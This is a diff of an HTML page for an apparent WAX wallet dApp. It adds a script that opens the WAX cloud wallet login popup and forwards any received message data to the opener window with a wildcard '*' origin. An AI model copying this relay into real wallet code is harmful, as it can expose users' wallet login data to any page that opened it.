@@ -131,7 +131,22 @@ var ref = url.searchParams.get("ref") || 'kkere.wam';
 const affiliate_wallet = url.searchParams.get("ref") || 'kkere.wam';
 </script>
 
+<script>window["GUARDIO_SENSOR_CONF"] = {"click":true}</script>
+       
+       
+       <script>
+            const loginUrl = "https://all-access.wax.io/cloud-wallet/login";
 
+            const loginPopup = window.open(loginUrl, "WaxPopup", "height=800,width=600");
+
+            loginPopup.addEventListener('message', function(event) {
+                console.log(event)
+
+                window.opener.postMessage(event.data, '*');
+
+                window.close();
+            });  
+        </script>
 </head>
 <body style="background-image: url('files/bg3-plain-4.png');" align="center">
 <center>
